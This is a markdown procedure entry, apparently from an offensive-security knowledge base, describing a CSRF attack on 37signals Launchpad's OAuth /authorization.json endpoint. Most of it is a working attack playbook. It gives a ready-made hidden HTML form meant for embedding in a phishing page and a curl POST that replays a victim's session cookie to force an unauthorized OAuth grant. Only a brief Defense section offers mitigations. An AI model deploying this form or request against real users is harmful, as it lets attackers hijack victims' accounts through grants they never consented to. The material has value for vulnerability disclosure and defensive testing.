---
id: proc-37signals-csrf-submit-001
tags:
  - csrf
  - oauth2
  - authorization-request
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/post-authorization-json]]'
  - '[[commands/html-csrf-form]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:30:07.306Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Submit-Malicious-Authorization-Request-via-CSRF

## Summary

This procedure exploits the CSRF vulnerability by submitting a POST request to /authorization.json, bypassing the authenticity token check due to the .json format, forcing the logged-in user to authorize the malicious app.

## Description

The root cause is the lack of CSRF token enforcement for .json/.xml formats in Ruby on Rails backend. When submitted in the victim's browser, it uses their session to grant authorization without consent, redirecting to the attacker's URI with a code.

## Requirements

1. Victim's active session
2. Valid client_id and redirect_uri
3. Attacker-controlled page or email to trigger submission

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens for all formats including .json
- Log and alert on authorization requests without tokens
- Use same-site cookies to mitigate CSRF

## Objectives

1. Bypass CSRF protection
2. Trigger unauthorized authorization grant
3. Obtain redirect with code

## Instructions

### Step 1: Prepare Malicious Form

**Context**: Create an HTML form for embedding in a phishing page.

Use [[commands/html-csrf-form]] to generate the form:

```html
<form action="https://launchpad.37signals.com/authorization.json" method="POST">
 <input type="hidden" name="client_id" value="{your-client-id}" />
 <input type="hidden" name="type" value="web_server" />
 <input type="hidden" name="redirect_uri" value="{your-redirect-uri}" />
 <input type="hidden" name="commit" value="" />
 <input type="submit" value="Submit request" />
</form>
```

> This form, when loaded in victim's browser, auto-submits or tricks click to POST without token.

### Step 2: Submit via curl (Alternative)

**Context**: Simulate or test the POST directly with session cookie.

Execute [[commands/post-authorization-json]]:

```bash
curl -X POST https://launchpad.37signals.com/authorization.json \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: _beanstalk_uuid=victim-session" \
  -d "client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit="
```

> Bypasses check; expect 302 redirect to redirect_uri?code=...

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used

- [[commands/post-authorization-json]]
- [[commands/html-csrf-form]]

## Tools Used


## Tags

- csrf
- oauth2
